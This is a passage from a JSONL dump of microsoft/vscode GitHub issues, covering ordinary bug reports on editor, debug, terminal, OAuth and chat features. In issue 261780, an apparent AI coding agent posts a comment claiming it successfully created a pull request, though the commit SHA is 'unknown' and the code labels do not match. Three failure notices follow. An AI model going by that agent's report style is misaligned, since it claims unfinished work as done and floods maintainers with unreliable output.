{"repo": "microsoft/vscode", "issue_number": 271272, "issue_url": "https://github.com/microsoft/vscode/issues/271272", "issue_title": "Bug: GitHub review agent not receiving custom instructions", "issue_author": "chrmarti", "issue_body": "Related: https://github.com/microsoft/vscode/issues/271143\n", "issue_labels": ["bug", "chat-review"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 269674, "issue_url": "https://github.com/microsoft/vscode/issues/269674", "issue_title": "CVE-2025-26791 in DOMPurify", "issue_author": "vadimpopa", "issue_body": "Hi,\n\ncould you please update DOMPurify to latest. We've got a CVE report.\n\nhttps://nvd.nist.gov/vuln/detail/CVE-2025-26791\n\nThanks.", "issue_labels": ["bug", "upstream", "unreleased"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 271140, "issue_url": "https://github.com/microsoft/vscode/issues/271140", "issue_title": "Delegate to coding agent everywhere", "issue_author": "bpasero", "issue_body": "I am still seeing this codelens everywhere in this code:\n\n<img width=\"1250\" height=\"542\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/e6798300-a243-4c15-b982-1882d251b818\" />\n\nhttps://github.com/microsoft/vscode/blob/7e18f586adcdeccda4777b91be3b8a7e1c428cfa/src/vs/workbench/contrib/chat/browser/chatContentParts/chatTodoListWidget.ts#L345-L351", "issue_labels": ["bug", "important"], "comments": [{"author": "joshspicer", "body": "This is because it's matching `todo` and not enforcing that this `todo` is in a comment.  \n\nChange is under discussion https://github.com/microsoft/vscode-pull-request-github/pull/7962\n\nI will disable the feature for now https://github.com/microsoft/vscode-pull-request-github/pull/7980/"}, {"author": "bpasero", "body": "@joshspicer but its not matching \"todo\", it is matching any word where \"todo\" appears in the word it seems \ud83e\udd14 \n\nIf we want to ship a code lense for this (which I think we should discuss in our UX calls), then at the minimum:\n* `todo` should only match if its a single word, i.e. not surrounded by other word characters\n* ideally we can probe for the tokens at the word level to see if its a comment as identified by the language"}, {"author": "joshspicer", "body": "@bpasero I've added comment probing in https://github.com/microsoft/vscode-pull-request-github/pull/7962. \n\nFYI it's borrowing the same matching logic we already had for the quickfix (with the addition of checking that it resides in a comment now)\n\nIt's now disabled by a setting for now, though I think matching within a comment resolves the primary issue.  I would think we'd want to match on something like\n\n```\n//todo(...)\n```\n\nwhich is surrounded by other words while in a comment"}, {"author": "bpasero", "body": "> which is surrounded by other words while in a comment\n\nYes, but that should be easy to figure out because the other characters are not `a-zA-Z0-9`"}]}
{"repo": "microsoft/vscode", "issue_number": 255851, "issue_url": "https://github.com/microsoft/vscode/issues/255851", "issue_title": "Icon are clipped in terminal suggest when using lineHeight", "issue_author": "Tyriar", "issue_body": "Repro\n\n```\n\"terminal.integrated.lineHeight\": 1.1,\n```\n\n<img width=\"771\" height=\"470\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/55842803-81fb-4494-bfff-2b20cd9c241f\" />\n\nWithout that it's fine:\n\n<img width=\"386\" height=\"96\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b9ba7131-854b-4b43-aebf-66af271ce5e6\" />\n\n1.1 is meant to multiply the default line height by 1.1, and it looks like it's making it smaller. The line height settings in terminal and editor work a little differently from each other.", "issue_labels": ["bug", "unreleased", "papercut :drop_of_blood:", "terminal-suggest"], "comments": [{"author": "Tyriar", "body": "<img width=\"618\" height=\"306\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/7a5afc4c-0508-4735-8fd8-aa12701a7c8c\" />"}, {"author": "pwang347", "body": "Note: it's technically possible to get clipped lines in the editor as well by setting editor.suggestLineHeight to 8.\n\n<img width=\"459\" height=\"57\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/e0cc96d4-2158-47f5-8869-b4349f4bba83\" />\n\nThough in this case since Linux users are set to 1.1 by default we should probably make sure that the default isn't a clipped experience. In the linked PR, I set the new baseline min value to be the non-clipped height."}]}
{"repo": "microsoft/vscode", "issue_number": 233049, "issue_url": "https://github.com/microsoft/vscode/issues/233049", "issue_title": "Search Only in Open Editors does not work if file name has square bracket", "issue_author": "Jakub-Mroczek", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: Yes/No\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.94.2\n- OS Version: Windows 11\n\nSteps to Reproduce:\n\n1. Name a file with closed or open square brackets []\n2. Open in editor and search only in open editors\n![Image](https://github.com/user-attachments/assets/d5ce22f3-95c8-425f-bc51-9d0ebb89818e)\n", "issue_labels": ["bug", "search", "unreleased"], "comments": [{"author": "vs-code-engineering[bot]", "body": "Thanks for creating this issue! It looks like you may be using an old version of VS Code, the latest stable release is 1.95.1. Please try upgrading to the latest version and checking whether this issue remains.\n\nHappy Coding!"}]}
{"repo": "microsoft/vscode", "issue_number": 159551, "issue_url": "https://github.com/microsoft/vscode/issues/159551", "issue_title": "Clicking cogwheel puts cursor on the wrong row when a compound-configuraton exists", "issue_author": "xerosugar", "issue_body": "\r\nType: <b>Bug</b>\r\n\r\nUsually when you click the cogwheel next to the configuration name it places the cursor next to that configuration's name in the launch file. However, if you have a compound in your launch.json that mentions a certain configuration, then clicking the cogwheel will put the cursor on the line inside the 'compounds' object that mentiones that configuration, not inside the named configuration like usual.\r\n\r\nVS Code version: Code 1.70.2 (e4503b30fc78200f846c62cf8091b76ff5547662, 2022-08-16T05:36:25.715Z)\r\nOS version: Linux x64 5.18.17-200.fc36.x86_64\r\nModes:\r\n\r\n<details>\r\n<summary>System Info</summary>\r\n\r\n|Item|Value|\r\n|---|---|\r\n|CPUs|AMD Ryzen 7 PRO 5750G with Radeon Graphics (16 x 400)|\r\n|GPU Status|2d_canvas: unavailable_software<br>canvas_oop_rasterization: disabled_off<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: disabled_software<br>multiple_raster_threads: enabled_on<br>opengl: disabled_off<br>rasterization: disabled_software<br>raw_draw: disabled_off_ok<br>skia_renderer: enabled_on<br>video_decode: disabled_software<br>video_encode: disabled_software<br>vulkan: disabled_off<br>webgl: unavailable_software<br>webgl2: unavailable_software|\r\n|Load (avg)|0, 0, 0|\r\n|Memory (System)|31.14GB (10.47GB free)|\r\n|Process Argv|--unity-launch --crash-reporter-id 60a43f92-093c-479d-9594-8d692eb08608|\r\n|Screen Reader|no|\r\n|VM|0%|\r\n|DESKTOP_SESSION|gnome|\r\n|XDG_CURRENT_DESKTOP|GNOME|\r\n|XDG_SESSION_DESKTOP|gnome|\r\n|XDG_SESSION_TYPE|wayland|\r\n</details><details><summary>Extensions (3)</summary>\r\n\r\nExtension|Author (truncated)|Version\r\n---|---|---\r\nvscode-drawio|hed|1.6.4\r\nrest-client|hum|0.25.1\r\ngitblame|wad|9.0.1\r\n\r\n\r\n</details><details>\r\n<summary>A/B Experiments</summary>\r\n\r\n```\r\nvsliv368:30146709\r\nvsreu685:30147344\r\npython383cf:30185419\r\nvspor879:30202332\r\nvspor708:30202333\r\nvspor363:30204092\r\nvslsvsres303:30308271\r\npythonvspyl392:30443607\r\nvserr242:30382549\r\npythontb:30283811\r\nvsjup518:30340749\r\npythonptprofiler:30281270\r\nvshan820:30294714\r\nvstes263cf:30335440\r\nvscorecescf:30445987\r\npythondataviewer:30285071\r\nvscod805cf:30301675\r\nbinariesv615:30325510\r\nbridge0708:30335490\r\nbridge0723:30353136\r\ncmake_vspar411cf:30542925\r\nvsaa593cf:30376535\r\npythonvs932:30410667\r\nwslgetstarted:30449410\r\ncppdebug:30492333\r\npylanb8912:30545647\r\nvsclangdc:30486549\r\nc4g48928:30535728\r\nhb751961:30553087\r\ndsvsc012cf:30540253\r\nazure-dev_surveyone:30548225\r\n2144e591:30553903\r\n\r\n```\r\n\r\n</details>\r\n\r\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "help wanted", "debug"], "comments": [{"author": "bryanchen-d", "body": "I cannot reproduce the issue on version 1.105.0. Looks like it has been fixed."}]}
{"repo": "microsoft/vscode", "issue_number": 136574, "issue_url": "https://github.com/microsoft/vscode/issues/136574", "issue_title": "Change Focus Area Issue While Debugging", "issue_author": "zohaibmalik994", "issue_body": "Issue Type: <b>Bug</b>\r\n\r\nWhen I have multiple windows open and I have different focus areas set for each. Then when I try to debug the code and if it returns an error, it shows an error on both windows on that line and also changes the position to that error for both windows and I have re-navigate to the desired area again, however, it should only change position for the active window and not the other.\r\n(Also, sometimes we have more than 2 windows and the same issue cause frustration to set areas back for each window separately.)\r\nIs this something a default behavior or can it be considered as an issue?\r\n\r\n\r\n![Issue While Debugging](https://user-images.githubusercontent.com/53822892/140614358-e12e3f05-e6a9-46af-b334-4a1d87398705.png)\r\n(Attached is a screenshot for further clarification. I am using though Adobe ExtendScript Debugger with JavaScript code.)\r\n\r\nVS Code version: Code 1.62.0 (b3318bc0524af3d74034b8bb8a64df0ccf35549a, 2021-11-03T15:23:01.379Z)\r\nOS version: Windows_NT x64 10.0.19043\r\nRestricted Mode: No\r\n\r\n<details>\r\n<summary>System Info</summary>\r\n\r\n|Item|Value|\r\n|---|---|\r\n|CPUs|Intel(R) Core(TM)2 Quad CPU    Q9650  @ 3.00GHz (4 x 3000)|\r\n|GPU Status|2d_canvas: enabled<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>oop_rasterization: unavailable_off<br>opengl: enabled_on<br>rasterization: unavailable_off<br>skia_renderer: enabled_on<br>video_decode: unavailable_off<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: unavailable_off|\r\n|Load (avg)|undefined|\r\n|Memory (System)|5.87GB (0.83GB free)|\r\n|Process Argv|--crash-reporter-id ced21870-82c3-4a0c-8d37-f749c37e0e4f|\r\n|Screen Reader|no|\r\n|VM|0%|\r\n</details><details><summary>Extensions (3)</summary>\r\n\r\nExtension|Author (truncated)|Version\r\n---|---|---\r\nextendscript-debug|Ado|1.1.2\r\nxd|ado|1.2.3\r\ntexttojsxbin|mot|0.0.5\r\n\r\n\r\n</details><details>\r\n<summary>A/B Experiments</summary>\r\n\r\n```\r\nvsliv368cf:30146710\r\nvsreu685:30147344\r\npython383:30185418\r\nvspor879:30202332\r\nvspor708:30202333\r\nvspor363:30204092\r\npythontb:30283811\r\npythonptprofiler:30281270\r\nvshan820:30294714\r\nvstes263:30335439\r\npythondataviewer:30285071\r\nvscod805:30301674\r\npythonvspyt200:30340761\r\nbinariesv615:30325510\r\nvsccppwtct:30382698\r\nbridge0708:30335490\r\npygetstartedt3:30385195\r\ndockerwalkthru:30377721\r\nbridge0723:30353136\r\npythonrunftest32:30373476\r\npythonf5test824:30373475\r\njavagetstartedt:30391933\r\npythonvspyt187:30373474\r\nvsqsis400:30386382\r\nvsaa593cf:30376535\r\nvssld246:30386377\r\n\r\n```\r\n\r\n</details>\r\n\r\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "debug", "insiders-released", "debug-triggered-breakpoint"], "comments": [{"author": "weinand", "body": "I agree, the exception should only be revealed in the active editor. "}]}
{"repo": "microsoft/vscode", "issue_number": 152407, "issue_url": "https://github.com/microsoft/vscode/issues/152407", "issue_title": "Using debug console picker when not paused leaves console unresponsive", "issue_author": "roblourens", "issue_body": "- Start two node launch configs\r\n- Both sessions are running and not paused\r\n- Use the debug console switcher to switch consoles\r\n- Evaluate `1+1`, there is no response\r\n\r\nIn the console picker, we show parent sessions. The child needs to be focused to get the evaluate requests. When a child is paused, we will focus that one with this code\r\n\r\nhttps://github.com/microsoft/vscode/blob/16c2a3ab3be4cf89c71fcce1ff1c11a06fcb923a/src/vs/workbench/contrib/debug/browser/repl.ts#L890-L896\r\n\r\nI think this is the same as https://github.com/microsoft/vscode/issues/112595 except we still need to pick a child when not paused, and it also doesn't work when a deeper child is stopped instead.\r\n\r\nhttps://github.com/microsoft/vscode/issues/138963 is relevant too\r\n\r\nBasically when something tries to focus a new wrapper parent session, we should always focus one of its children instead. cc @isidorn ", "issue_labels": ["bug", "debug", "unreleased"], "comments": [{"author": "isidorn", "body": "@roblourens agree. It feels very similar to that one. I have to admit that the debug console focussing of sessions is not super clean."}]}
{"repo": "microsoft/vscode", "issue_number": 261780, "issue_url": "https://github.com/microsoft/vscode/issues/261780", "issue_title": "Unable to transform UPPER_CASE to PascalCase", "issue_author": "EFanZh", "issue_body": "- VS Code Version: 1.103.1\n- OS Version: Windows 11\n\nSteps to Reproduce:\n\n1. Type `FOO_BAR` in an empty editor.\n2. Select typed `FOO_BAR`.\n3. Open command palette and execute \u201cTransform to Pascal Case\u201d command.\n4. Expect the selected text becoming `FooBar`, got `FOOBAR` instead.\n", "issue_labels": ["bug", "help wanted", "good first issue", "editor-core", "unreleased"], "comments": [{"author": "hediet", "body": "Thanks for reporting! This needs a unit test ;) Up for a PR?"}, {"author": "Selva-Ganesh-M", "body": "Hi, I\u2019m new to OSS contributions.\n\nWhile looking into this issue, I noticed the new request contradicts the current behavior.\n\n**Current (Live):** \n\n1. parseHTMLString \u2192 ParseHTMLString\n2. getElementById \u2192 GetElementById\n3. audioConverter.convertM4AToMP3() \u2192 AudioConverter.ConvertM4AToMP3()\n\n**Issue (Proposed):** \n\n1. FOO_BAR \u2192 FooBar\n\nApplying the new rule would turn _parseHTMLString_ into _Parsehtmlstring_ (or _ParseHtmlString_ if acronyms are split), both of which break the current expectation.\n\nI\u2019d be happy to contribute, but I\u2019ll need some guidance on which direction the project prefers."}, {"author": "EFanZh", "body": "Here is my suggested regex for splitting words:\n\n```text\n\\p{Lu}+(?!\\p{Ll})|    <!-- Uppercase acronyms -->\n\\p{Lu}\\p{Ll}*|        <!-- Title case -->\n\\p{Ll}+|              <!-- Lowercase words -->\n\\p{L}+|               <!-- Words from scripts without case -->\n\\p{N}+                <!-- Numbers from any script -->\n```\n\nModifications can be applied as needed."}, {"author": "Selva-Ganesh-M", "body": "I\u2019ve worked on a fix that supports the new expectation \n\n> FOO_BAR \u2192 FooBar\n\n> FOO BAR A \u2192 FooBarA\n\nwhile keeping the current behavior intact.\n\n> parseHTMLString \u2192 ParseHTMLString, \n\n> audioConverter.convertM4AToMP3() \u2192 AudioConverter.ConvertM4AToMP3()\n\nI\u2019ve also added unit tests to cover both cases. \n\nI\u2019ll raise a PR shortly \u2014 reviews and suggestions are welcome."}, {"author": "Cyan-476", "body": "There are workarounds for this:\nselect FOO_BAR \u2192 run \"Transform to Camel Case\" \u2192 fooBar \u2192 run \"Transform to Pascal Case\" \u2192 FooBar\nonly solution :)"}, {"author": "KH-Coder865", "body": "ok\n"}, {"author": "nk-ag", "body": "\ud83e\udd16 **AI Code Generation Complete!**\n\n**Agent Type:** general_developer\n**Status:** completed\n**Branch:** fix-issue-261780\n**Pull Request:** https://github.com/microsoft/vscode/pull/new/fix-issue-261780\n**Commit SHA:** unknown\n\nThe AI agent has successfully generated code and created a Pull Request to address this issue.\n\n**Generated Code Preview:**\n```python\n{\n  \"code\": {\n    \"file_path\": \"src/vs/editor/contrib/transformations/browser/transformCase.ts\",\n    \"content\": \"import * as nls from 'vs/nls';\\nimport { ServicesAccessor } from 'vs/platform/instantiation/common/instantiation';\\nimport { EditorAction, registerEditorAction } from 'vs/editor/browser/editorExtensions';\\nimport { ICodeEditor } from 'vs/editor/browser/editorBrowser';\\nimport { Selection } from 'vs/editor/common/core/selection';\\n\\n/**\\n * Helper that converts any identifier (snake_ca...\n```\n\n**Files Modified:**\n- create: fixes/issue_261780.py\n\n**Next Steps:**\n1. Review the generated code in the Pull Request\n2. Test the changes if applicable\n3. Merge the PR if the solution meets requirements\n4. Close this issue once the fix is deployed\n\n---\n*This solution was automatically generated by an AI coding agent.*"}, {"author": "nk-ag", "body": "\u274c **AI Code Generation Failed**\n\n**Agent Type:** general_developer\n**Status:** error\n**Branch:** fix-issue-261780\n**Task ID:** task_microsoft_vscode_261780\n\nThe AI agent encountered an error while processing this issue.\nPlease check the logs for more details or try running the workflow again.\n\n**Generated Code (if any):**\n```python\nimport * as strings from 'vs/base/common/strings';\nimport { EditorAction, registerEditorAction } from 'vs/editor/browser/editorExtensions';\nimport { ICodeEditor } from 'vs/editor/browser/editorBrowser';\nimport { Selection } from 'vs/editor/common/core/selection';\nimport { IEditorAction } from 'vs/ed...\n```"}, {"author": "nk-ag", "body": "\u274c **AI Code Generation Failed**\n\n**Agent Type:** general_developer\n**Status:** error\n**Branch:** fix-issue-261780\n**Task ID:** task_microsoft_vscode_261780\n\nThe AI agent encountered an error while processing this issue.\nPlease check the logs for more details or try running the workflow again.\n\n**Generated Code (if any):**\n```python\n/*---------------------------------------------------------------------------------------------\n *  Copyright (c) Microsoft Corporation. All rights reserved.\n *  Licensed under the MIT License. See License.txt in the project root for license information.\n *-------------------------------------------...\n```"}, {"author": "nk-ag", "body": "\u274c **AI Code Generation Failed**\n\n**Agent Type:** general_developer\n**Status:** error\n**Branch:** fix-issue-261780\n**Task ID:** task_microsoft_vscode_261780\n\nThe AI agent encountered an error while processing this issue.\nPlease check the logs for more details or try running the workflow again.\n\n**Generated Code (if any):**\n```python\n{\n  \"code\": {\n    \"file_path\": \"src/vs/editor/contrib/transform/transform.ts\",\n    \"content\": \"import { registerEditorCommand } from 'vs/editor/browser/editorExtensions';\\nimport { ICodeEditor } from 'vs/editor/browser/editorBrowser';\\nimport { ServicesAccessor } from 'vs/editor/common/editorCommon'...\n```"}, {"author": "shikhar3dev", "body": "Hi, I\u2019m new to contributing to VS Code. I went through this issue and PR #265600.  \nI\u2019d love to help by either:  \n- testing the changes locally and reporting results, OR  \n- adding more unit tests for edge cases (like multi-word UPPER_CASE strings).  \n\nCan I work on this?  \n"}, {"author": "youssefnabil2030", "body": "Hi @hediet \ud83d\udc4b,\nI\u2019m Youssef Nabil \u2014 a software engineer and Python developer interested in contributing to VS Code.\nI noticed this issue (#261780) still open and saw related PR #265600.\nI\u2019d love to help by testing the fix locally and adding more unit tests for edge cases (like multiple underscores or acronyms).\nCould I assist with this?"}, {"author": "hediet", "body": "@youssefnabil2030 thanks for your help! I think #262959 already has enough tests, but feel free to test locally! If there are edge-cases that the current tests don't cover, we'd be happy about a PR!"}]}
{"repo": "microsoft/vscode", "issue_number": 250648, "issue_url": "https://github.com/microsoft/vscode/issues/250648", "issue_title": "Migration path for extensions relying on navigator for web environment detection", "issue_author": "deepak1556", "issue_body": "The NodeJS extension host is now updated to v22 from v20 as part of our Electron 35 update. This updates brings is support for [`navigator` global object](https://github.com/nodejs/node/commit/b40f0c30743aaecd57071f7be305df43e1083817) in the desktop and remote extension hosts. If an extension relied on the presence of `navigator` to detect web environment then this would break today. We should offer a migration path for such extensions,\n\n- [x] Enable navigator object in global scope of desktop and remote extension host behind setting\n- [x] Capture telemetry for extensions usage and surface visible error https://github.com/microsoft/vscode/pull/250619\n- [x] Document changes in release notes https://github.com/microsoft/vscode-docs/pull/8446", "issue_labels": ["bug", "verified", "extensions", "insiders-released"], "comments": [{"author": "deepak1556", "body": "**Steps for Verification**\n\n* Add `console.log(navigator)` to https://github.com/microsoft/vscode-extension-samples/blob/cf30922221d1c2dcb819da857b7f64583991fed0/helloworld-minimal-sample/extension.js#L15\n* Debug and Run the extension\n* Confirm that the output of the log is `undefined`\n* Verify that extension host log contains `PendingMigrationError is deprecated. navigator is now a global in nodejs, please see https://aka.ms/vscode-extensions/navigator for additional info on this error.` followed by error stack that makes sense\n* Change the setting `extensions.supportNodeGlobalNavigator` to `true` and reload the window\n* Debug and Run the extension\n* Confirm that the output of the log contains a valid navigator object and there are no error messages from this extension"}, {"author": "bpasero", "body": "@deepak1556 @jrieken how are we looking like today, our error telemetry is full with pages of this error, can we at least exclude it from telemetry or stop the submission?\n\n<img width=\"956\" height=\"167\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/9dbc4c4d-b169-474b-8776-dd77762eb1b7\" />"}, {"author": "deepak1556", "body": "We have good enough information via `monacoworkbench/exthostdeprecatedapiusage` of the affected extensions to reach out to, looking at the error telemetry stacks I am not finding them useful with the redacted and minified symbols. @jrieken thoughts on keeping the report for `monacoworkbench/exthostdeprecatedapiusage` as such and disable reporting into error telemetry ?"}, {"author": "deepak1556", "body": "Refs https://github.com/microsoft/vscode/pull/271252"}]}
{"repo": "microsoft/vscode", "issue_number": 261364, "issue_url": "https://github.com/microsoft/vscode/issues/261364", "issue_title": "VS Code OAuth2 Flow Violates RFC 8707: Missing Resource Parameter in Token Exchange Request", "issue_author": "bluedog13", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: Yes/No\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version:  Version: 1.104.0-insider (Universal)\n- OS Version:  15.6 (24G84) MAC\n\n**Problem**\nVS Code's external authorization code request includes a resource indicator which allows AuthZ server to construct the token narrowly targeted for the protected resource (MCP server). However, VSCode doesn't include the same resource indicator into subsequent token request (exchange code for tokens) as mandated by rfc8707 (https://datatracker.ietf.org/doc/html/rfc8707#token-endpoint-example-ac). When resource indicator is present on the authorize request but is missing from the token request, some implementations of IDPs will fail to create an audience claim on the resulting token resulting in token validation failures on the protected resource (MCP server).\n\n**Root Cause**\nMissing check for the resource indicator leading to a missing resource indicator parameter in the exchange code for token request.\n\n**Impact**\nToken validation failures on the protected resource due to missing audience.\n\n**Code Reference**\nThis code perhaps may be the cause\nhttps://github.com/microsoft/vscode/blob/0e00a15ef0c59d39aff227c63fb3c55b1b25f9ac/src/vs/workbench/api/common/extHostAuthentication.ts#L599\n", "issue_labels": ["bug", "verified", "authentication", "insiders-released", "chat-mcp"], "comments": [{"author": "bluedog13", "body": "This missing \"resource\" parameter violates the MCP Authorization specification requirements. \n\nAccording to the https://modelcontextprotocol.io/specification/draft/basic/authorization#access-token-privilege-restriction, \nMCP clients MUST implement and use   the resource parameter as defined in https://www.rfc-editor.org/rfc/rfc8707.html to explicitly specify the target resource for which the token is being requested."}, {"author": "bluedog13", "body": "I have submitted a PR for the same\nhttps://github.com/microsoft/vscode/pull/261815\n\n"}]}
{"repo": "microsoft/vscode", "issue_number": 259967, "issue_url": "https://github.com/microsoft/vscode/issues/259967", "issue_title": "Chat agent: closing editor shows a weird confirmation dialog", "issue_author": "bpasero", "issue_body": "Steps to Reproduce:\n\n1.  open an agent in editor\n2. close the editor\n\n\ud83d\udc1b  =>\n\n<img width=\"307\" height=\"229\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b7f3435b-946b-4e37-a3b0-7c7c974dd3f9\" />\n", "issue_labels": ["bug", "verified", "insiders-released", "workbench-copilot"], "comments": [{"author": "nguyenchristy", "body": "I see this now, so I'm going to consider this \"not weird.\"\n<img width=\"538\" height=\"260\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/903bfdab-caee-40ae-9d15-f4904b684502\" />\n"}]}
{"repo": "microsoft/vscode", "issue_number": 260950, "issue_url": "https://github.com/microsoft/vscode/issues/260950", "issue_title": "Create bug on github button should allow us to use different browsers", "issue_author": "amithegde", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! feature_request_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- Please search existing issues to avoid creating duplicates. -->\n\n<!-- Describe the feature you'd like. -->\n\n<img width=\"252\" height=\"93\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f4ce13ab-aecb-42e4-9c09-a4106b339068\" />\nPlease allow using different browsers, it opens my default browser but I don't use the default browser to sign into this github account", "issue_labels": ["bug", "verified", "issue-reporter", "insiders-released"], "comments": [{"author": "TylerLeonhardt", "body": "@justschen this should honor @bpasero's setting to change the default browser"}, {"author": "bpasero", "body": "Specifically `workbench.externalBrowser` which is what we end up using in calls to `INativeHostService.openExternal` or any `IOpenerService` use."}, {"author": "Yoyokrazy", "body": "Sounds good @bpasero, will get that switched over. "}, {"author": "bpasero", "body": "@Yoyokrazy curious what you are currently using to open a URL that makes this not work?"}, {"author": "Yoyokrazy", "body": "@bpasero I haven't looked into all of the issue reporter yet. I just now took it over from justin and haven't had time to do a full review of where all the components of it stand/the current issues. This may be a trivial fix, just haven't dug in yet."}]}
{"repo": "microsoft/vscode", "issue_number": 259268, "issue_url": "https://github.com/microsoft/vscode/issues/259268", "issue_title": "Unable to clear API key or specify BYOK model in Insiders build", "issue_author": "burkeholland", "issue_body": "## Bug Description\nIn the latest Insiders build, I'm unable to clear out the API key for Gemini, and there is no apparent way to specify which Gemini model to use. This functionality works as expected in stable, but in Insiders, the following issues occur:\n- The API key cannot be cleared or reset. Hitting Enter with the field empty dismisses the command pallette, but appears to do nothing.\n- There is no option to select or specify a particular Gemini model.\n\n### Steps to Reproduce\n1. Open VS Code Insiders.\n2. Attempt to clear the Gemini API key by pressing enter in the empty field\n3. Try to specify a Gemini model to use for AI features.\n\n### Expected Behavior\n- The Gemini API key should be clearable/resettable in Insiders, just like in stable.\n- I should be able to add a model that doesn't exist with the \"plus\" icon.\n\n### Actual Behavior\n- The API key is stuck and cannot be cleared.\n- No + option is available.\n\n### Additional Information\nRelevant code related to secret state management and API key handling:\n\nVersion: 1.103.0-insider (user setup)\nCommit: 6977c2a503c0fefc0f9290111c4154482c63b856\nDate: 2025-08-01T03:48:00.876Z\nElectron: 37.2.3\nElectronBuildId: 12035395\nChromium: 138.0.7204.100\nNode.js: 22.17.0\nV8: 13.8.500258-electron.0\nOS: Windows_NT x64 10.0.26100\n\nCopilot Chat Version: 0.30.2025073102\n", "issue_labels": ["bug", "verified", "model-byok"], "comments": [{"author": "lramos15", "body": "This should all be fixed.\n\nNote the `+` was replaced with the OpenAI Compatible model provider entry instead"}, {"author": "TylerLeonhardt", "body": "Verified but opened https://github.com/microsoft/vscode/issues/265048"}]}
{"repo": "microsoft/vscode", "issue_number": 261625, "issue_url": "https://github.com/microsoft/vscode/issues/261625", "issue_title": "Could not read image: invalid base64 image string", "issue_author": "zuberkhan01st", "issue_body": "\nType: <b>Bug</b>\n\nCould not read image: invalid base64 image string\n\nExtension version: 0.31.2025081401\nVS Code version: Code - Insiders 1.104.0-insider (95db854cd8dd72aeea01ae3ca2b10a3323435c00, 2025-08-13T05:05:10.751Z)\nOS version: Windows_NT x64 10.0.26100\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|AMD Ryzen 5 5600H with Radeon Graphics          (12 x 3294)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|undefined|\n|Memory (System)|15.41GB (4.36GB free)|\n|Process Argv|--crash-reporter-id 11fb0257-4ed0-46f5-bd9d-14f3b0ba5529|\n|Screen Reader|no|\n|VM|0%|\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\npythonvspyt551cf:31249598\nnativeloc1:31118317\ndwcopilot:31158714\n6074i472:31201624\ndwoutputs:31242946\ncopilot_t_ci:31333650\ng012b348:31231168\npythoneinst12:31251391\n6gi0g917:31259950\n996jf627:31264550\npythonrdcb7:31268811\nusemplatestapi:31297334\n747dc170:31275146\npythonpcpt1cf:31345881\n6518g693:31302842\n9d2cg352:31346308\nb99bg931:31349649\nusemarketplace:31343026\n0g1h6703:31329154\nb6b4d950:31327385\nnes-emitfast-1:31333560\nreplacestringexc:31350595\n6abeh943:31336334\nenvsactivate1:31349248\n0927b901:31340060\nnb18600_tf:31359574\neditstats-enabled:31346256\ngendocstringf:31358905\npylancealldocst:31362265\ncloudbuttont:31366566\nretryenabled:31365452\ntodos-0:31366869\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "author-verification-requested"], "comments": [{"author": "mjbvz", "body": "Please provide steps to reproduce the issue. A video showing how you caused it may also be useful /gifPlease"}, {"author": 